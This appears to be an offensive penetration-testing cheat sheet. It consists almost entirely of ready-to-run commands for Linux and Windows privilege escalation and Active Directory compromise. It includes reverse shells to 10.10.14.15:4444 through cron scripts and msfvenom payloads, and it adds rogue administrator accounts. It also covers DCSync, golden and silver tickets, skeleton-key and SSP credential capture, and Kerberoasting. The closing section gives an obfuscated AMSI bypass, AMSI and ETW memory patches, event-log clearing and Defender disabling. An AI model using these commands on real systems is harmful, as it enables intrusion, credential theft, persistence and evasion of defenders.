# LinPEAS shows: /usr/bin/find (SUID)
find / -exec /bin/bash -p \; -quit

# LinPEAS shows: /usr/bin/vim (SUID)
vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'

# LinPEAS shows: /usr/bin/bash (SUID)
bash -p

# LinPEAS shows: /usr/bin/nmap (SUID)
nmap --interactive
!sh

# LinPEAS shows: /usr/bin/awk (SUID)
awk 'BEGIN {system("/bin/bash -p")}'

# LinPEAS shows: /usr/bin/less (SUID)
less /etc/passwd
!bash

# Custom SUID exploit
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/exploit.c
gcc /tmp/exploit.c -o /tmp/exploit
chmod +s /tmp/exploit


# LinPEAS shows: /usr/bin/python3.8 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# LinPEAS shows: /usr/bin/perl = cap_setuid+ep
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'

# LinPEAS shows: /usr/bin/php = cap_setuid+ep
php -r "posix_setuid(0); system('/bin/bash');"


# Check: sudo -l
# If shows: (ALL) NOPASSWD: ALL
sudo bash

# If shows: (root) NOPASSWD: /usr/bin/find
sudo find /etc/passwd -exec bash \;

# If shows: (root) NOPASSWD: /usr/bin/vi
sudo vi -c ':!bash'

# If shows: (root) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# If shows: (root) NOPASSWD: /usr/bin/nmap
echo 'os.execute("/bin/bash")' > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

# If shows: (root) NOPASSWD: /usr/bin/git
sudo git -p help
!/bin/bash

# If shows: (root) NOPASSWD: /usr/bin/less
sudo less /etc/passwd
!/bin/bash

# LinPEAS shows writable cron script
echo '#!/bin/bash' > /path/to/cron/script.sh
echo 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1' >> /path/to/cron/script.sh
chmod +x /path/to/cron/script.sh

# Or if script runs as root and includes wildcard
# Create file: echo 'bash -i >& /dev/tcp/10.10.14.15/4444 0>&1' > /tmp/shell.sh
# Make executable: chmod +x /tmp/shell.sh
# Create symlink: ln -s /tmp/shell.sh /path/to/wildcard*

# WinPEAS shows: SERVICE - Weak Permissions (Users can modify)
# 1. Check service permissions:
sc.exe qc SERVICE_NAME
accesschk.exe -ucqv SERVICE_NAME

# 2. If Users can modify:
sc.exe config SERVICE_NAME binPath= "C:\Windows\System32\cmd.exe /c net user hacker Password123! /add"
sc.exe stop SERVICE_NAME
sc.exe start SERVICE_NAME

# 3. Alternative with PowerShell:
Set-Service -Name SERVICE_NAME -BinaryPathName "cmd.exe /c net localgroup administrators hacker /add"
Restart-Service -Name SERVICE_NAME -Force

# WinPEAS shows: Unquoted Service Path - "C:\Program Files\Some Folder\service.exe"
# 1. Check writable directories:
icacls "C:\"
icacls "C:\Program Files"

# 2. If "C:\Program" is writable:
copy C:\Windows\System32\cmd.exe "C:\Program.exe"
sc stop SERVICE_NAME
sc start SERVICE_NAME

# 3. Or create payload:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe -o Program.exe

# WinPEAS shows: AlwaysInstallElevated - 1
# 1. Create malicious MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f msi -o setup.msi

# 2. Transfer and install:
msiexec /quiet /qn /i C:\temp\setup.msi

# 3. Alternative with PowerShell:
$Command = "net user hacker Password123! /add && net localgroup administrators hacker /add"
$WScript = New-Object -ComObject WScript.Shell
$WScript.Run("cmd /c $Command", 0, $true)

# WinPEAS shows: DLL Hijacking possible
# 1. Find missing DLL:
procmon.exe (Filter for "NAME NOT FOUND")

# 2. Create malicious DLL:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f dll -o hijack.dll

# 3. Place in writable directory
copy hijack.dll "C:\ProgramData\Missing.dll"

# BloodHound shows: User has DCSync rights
# 1. Verify with PowerView:
Get-ObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $USER_SID}

# 2. Perform DCSync attack:
# Using Mimikatz:
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# Using Impacket from Kali:
impacket-secretsdump domain.com/user:'password'@DC_IP

# 3. Dump specific user:
impacket-secretsdump -just-dc-user Administrator domain.com/user:'password'@DC_IP

# BloodHound shows: GenericAll on User/Computer
# 1. Reset password (if GenericAll on user):
Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force)

# 2. Add to privileged group (if GenericAll on group):
Add-DomainGroupMember -Identity 'Domain Admins' -Members TargetUser

# 3. WriteDACL - Give yourself DCSync rights:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity AttackerUser -Rights DCSync

# 4. WriteOwner - Take ownership then modify:
Set-DomainObjectOwner -Identity TargetObject -OwnerIdentity AttackerUser
Add-DomainObjectAcl -TargetIdentity TargetObject -PrincipalIdentity AttackerUser -Rights ResetPassword

# BloodHound shows: Can create computer objects (ms-DS-MachineAccountQuota > 0)
# 1. Create computer account:
New-MachineAccount -MachineAccount FAKECOMPUTER -Domain domain.com

# 2. Set RBCD on target:
Set-DomainObject -Identity TARGETCOMPUTER$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=@('FAKECOMPUTER$')}

# 3. Get hash of FAKECOMPUTER:
Rubeus.exe hash /password:Password123! /user:FAKECOMPUTER$ /domain:domain.com

# 4. Get service ticket:
Rubeus.exe s4u /user:FAKECOMPUTER$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/TARGETCOMPUTER.domain.com /ptt

# 5. Access target:
dir \\TARGETCOMPUTER.domain.com\C$

# BloodHound shows: Computer with Unconstrained Delegation
# 1. Find computers with unconstrained delegation:
Get-DomainComputer -Unconstrained | Select-Object Name

# 2. Monitor for DA tokens (on compromised machine):
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 3. When DA connects, dump tickets:
Rubeus.exe triage
Rubeus.exe dump /service:krbtgt /nowrap

# 4. Import ticket on attacker machine:
Rubeus.exe ptt /ticket:BASE64_TICKET

# 5. DCSync with stolen ticket:
impacket-secretsdump -k -no-pass domain.com/

# BloodHound shows: Constrained Delegation with Protocol Transition
# 1. Check for allowed delegation:
Get-DomainUser -TrustedToAuth | Select samaccountname, msds-allowedtodelegateto

# 2. Request TGT with Rubeus:
Rubeus.exe asktgt /user:ServiceAccount /domain:domain.com /rc4:SERVICE_NTLM_HASH

# 3. Request service ticket for any service on target:
Rubeus.exe s4u /ticket:TGT_BASE64 /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.com /altservice:http,host,rpcss /ptt

# 4. Access target service:
dir \\TARGET.domain.com\C$

# Certipy shows: ENROLLEE_SUPPLIES_SUBJECT enabled
# 1. Request certificate:
certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template VULNERABLE-TEMPLATE -upn Administrator@domain.com

# 2. Get NT hash from certificate:
certipy auth -pfx administrator.pfx -dc-ip DC_IP

# 3. Use hash for authentication:
impacket-psexec -hashes :NTLM_HASH domain.com/Administrator@DC.domain.com

# Same as ESC1 but template allows any purpose
certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template ESC2-TEMPLATE -upn Administrator@domain.com -dns DC.domain.com

# 1. Request enrollment agent certificate:
certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template EnrollmentAgent -upn user@domain.com

# 2. Request certificate on behalf of Administrator:
certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template User -on-behalf-of domain.com\\Administrator -pfx user.pfx

# 1. Modify template to be vulnerable:
certipy template -u user@domain.com -p password -dc-ip DC_IP -template VULNERABLE-TEMPLATE -save-old -enrollee-supplies-subject

# 2. Now exploit as ESC1

# 1. Modify template to be vulnerable:
certipy template -u user@domain.com -p password -dc-ip DC_IP -template VULNERABLE-TEMPLATE -save-old -enrollee-supplies-subject

# 2. Now exploit as ESC1

# 1. Check if vulnerable:
certipy find -u user@domain.com -p password -dc-ip DC_IP -vulnerable

# 2. Exploit:
certipy req -u user@domain.com -p password -ca CA-NAME -target DC.domain.com -template ANY-TEMPLATE -upn Administrator@domain.com

# 1. Start relay:
ntlmrelayx.py -t http://DC.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Force authentication (via PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py -d domain.com -u user -p password 10.10.14.15 DC.domain.com

# 3. Get certificate, then get hash:
certipy auth -pfx DC.pfx -dc-ip DC_IP


# BloodHound shows: User in DNSAdmins group
# 1. Check membership:
Get-ADGroupMember -Identity "DnsAdmins" | Select-Object Name

# 2. Create malicious DLL:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f dll -o malicious.dll

# 3. Set DLL path:
dnscmd.exe /config /serverlevelplugindll \\10.10.14.15\share\malicious.dll

# 4. Restart DNS service:
sc.exe stop dns
sc.exe start dns

# Alternative with PowerShell:
Set-DnsServerPlugin -Name "malicious" -DllPath "\\10.10.14.15\share\malicious.dll" -Load
Restart-Service -Name DNS -Force


# BloodHound shows: Exchange Windows Permissions group
# 1. Check if user has WriteDACL on Domain Object:
Get-ObjectAcl -Identity "DC=domain,DC=com" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $USER_SID}

# 2. Add DCSync rights to yourself:
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity AttackerUser -Rights DCSync

# 3. Perform DCSync:
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# 4. Alternatively, if you have Exchange Server shell:
# Check for SeAssignPrimaryToken/SeImpersonate privileges
whoami /priv
# Use JuicyPotato/RoguePotato if available



# Requirements: krbtgt hash
# 1. Get krbtgt hash via DCSync:
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt

# 2. Create golden ticket:
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:HASH /ptt

# 3. Verify:
klist
dir \\DC.domain.com\C$

# 4. Create ticket file for later:
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /krbtgt:HASH /ticket:golden.kirbi

# 5. Use later:
Rubeus.exe ptt /ticket:golden.kirbi


# Requirements: Service account hash
# 1. Get service account hash (e.g., CIFS, HOST, HTTP):
mimikatz # sekurlsa::logonpasswords

# 2. Create silver ticket:
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:SID /target:DC.domain.com /service:cifs /rc4:SERVICE_HASH /ptt

# 3. Access service:
dir \\DC.domain.com\C$

# 1. Inject skeleton key (requires DA on DC):
mimikatz # misc::skeleton

# 2. Now any user can use password "mimikatz" to authenticate

# 3. Access with skeleton key:
net use \\DC.domain.com\IPC$ /user:Administrator mimikatz


# 1. Check if DSRM password is set:
ntdsutil "set dsrm password" "reset password on server null" q q

# 2. Change DSRM password (requires DA):
ntdsutil
set dsrm password
reset password on server DC01
<new_password>
<new_password>
q
q

# 3. Enable DSRM logon:
reg add HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# 4. Logon with DSRM credentials:
psexec.exe -s \\DC01 cmd.exe


# 1. Install malicious SSP (Mimikatz):
mimikatz # misc::memssp

# 2. All logons will be logged to C:\Windows\System32\mimilsa.log

# Alternative with custom SSP:
copy mimilib.dll C:\Windows\System32\
reg add "HKLM\System\CurrentControlSet\Control\Lsa\" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f


# 1. Get TGT with NTLM hash:
Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:NTLM_HASH /ptt

# 2. Use Kerberos authentication:
dir \\DC.domain.com\C$

# 3. Alternative with AES key (more stealthy):
Rubeus.exe asktgt /user:Administrator /domain:domain.com /aes256:AES_KEY /ptt

# 1. Export tickets from memory:
Rubeus.exe dump /nowrap

# 2. Pass ticket to another machine:
Rubeus.exe ptt /ticket:BASE64_TICKET

# 3. Use imported ticket:
klist
impacket-psexec -k -no-pass domain.com/Administrator@DC.domain.com

# 1. Kerberoast all users with SPNs:
Rubeus.exe kerberoast /outfile:hashes.txt

# 2. Kerberoast specific user:
Rubeus.exe kerberoast /user:sqlservice /outfile:sql.hash

# 3. Crack with hashcat:
hashcat -m 13100 hashes.txt rockyou.txt --force

# 1. Find AS-REP roastable users:
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# 2. Crack:
hashcat -m 18200 asrep.txt rockyou.txt --force


# 1. Simple bypass:
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) ) ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# 2. Alternative:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# 3. Memory patch:
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Am" + "si" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

# 1. Clear event logs:
wevtutil el | ForEach-Object {wevtutil cl "$_"}

# 2. Clear specific logs:
Clear-EventLog -LogName Security, Application, System

# 3. Disable logging:
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
Set-MpPreference -DisableRealtimeMonitoring $true

# 1. Patch ETW to avoid detection:
[Reflection.Assembly]::LoadWithPartialName('System.Core')
$etwProvider = [System.Diagnostics.Eventing.EventProvider]::new('Microsoft-Windows-Kernel-Processor-Power')
$etwProvider.SetInformation(18, [byte[]]@(0x00, 0x00))







































































































































































